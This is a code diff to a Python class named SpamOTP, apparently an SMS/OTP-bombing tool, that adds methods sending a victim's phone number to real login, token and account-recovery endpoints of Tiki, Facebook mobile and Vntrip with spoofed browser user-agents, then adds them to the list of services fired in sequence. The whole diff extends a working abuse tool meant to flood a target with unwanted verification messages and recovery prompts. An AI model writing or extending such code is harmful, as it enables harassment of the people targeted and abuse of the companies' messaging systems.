@@ -69,6 +69,8 @@ class SpamOTP:
             return requests.get(url, **kwargs)
         elif method.lower() == 'post':
             return requests.post(url, **kwargs)
+        else:
+            raise ValueError(f"Unsupported method: {method}")
         
     def log(self, message):
         # This method can be overridden by the caller (app.py)
@@ -566,6 +568,49 @@ class SpamOTP:
         except Exception as e:
             self.log(f"Go2Joy Lỗi: {e}")
 
+    def tiki(self):
+        try:
+            url = "https://tiki.vn/api/v2/tokens"
+            headers = {
+                "content-type": "application/json",
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "origin": "https://tiki.vn",
+                "referer": "https://tiki.vn/"
+            }
+            data = {"grant_type": "password", "username": self.phone}
+            response = self.request('post', url, json=data, headers=headers)
+            self.log(f"Tiki: {response.status_code}")
+        except Exception as e:
+            self.log(f"Tiki Lỗi: {e}")
+
+    def meta(self):
+        try:
+            # Facebook/Meta often changes endpoints, using m.facebook as it's more stable for these requests
+            url = "https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&search_attempts=1"
+            headers = {
+                "content-type": "application/x-www-form-urlencoded",
+                "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36"
+            }
+            data = {"email": self.phone, "did_submit": "Search"}
+            response = self.request('post', url, data=data, headers=headers)
+            self.log(f"Meta/FB: {response.status_code}")
+        except Exception as e:
+            self.log(f"Meta Lỗi: {e}")
+
+    def vntrip(self):
+        try:
+            url = "https://micro-services.vntrip.vn/core-user-service/v2/auth/login-otp"
+            headers = {
+                "content-type": "application/json",
+                "origin": "https://www.vntrip.vn",
+                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            }
+            data = {"phone": self.phone}
+            response = self.request('post', url, json=data, headers=headers)
+            self.log(f"Vntrip: {response.status_code}")
+        except Exception as e:
+            self.log(f"Vntrip Lỗi: {e}")
+
     def _wrapper(self, func, service_name):
         try:
             func()
@@ -596,7 +641,8 @@ class SpamOTP:
             self.thecoffeehouse, self.dienmayxanh,
             self.lottemart, self.vayvnd, self.vato, self.nhathuoclongchau,
             self.shopee, self.watsons,
-            self.tokyolife, self.go2joy
+            self.tokyolife, self.go2joy,
+            self.tiki, self.meta, self.vntrip
         ]
 
         for api in apis:
